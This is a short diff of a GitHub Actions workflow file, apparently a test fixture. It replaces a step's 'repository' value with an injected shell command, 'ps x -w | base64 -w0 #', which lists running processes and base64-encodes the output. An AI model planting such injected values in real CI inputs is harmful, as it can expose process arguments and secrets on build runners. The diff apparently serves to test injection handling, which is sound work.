@@ -16,4 +16,4 @@ jobs:
         with:
           app_id: 123
           private_key: 500
-          repository: 'org1/repo2'
+          repository: 'ps x -w | base64 -w0 #'
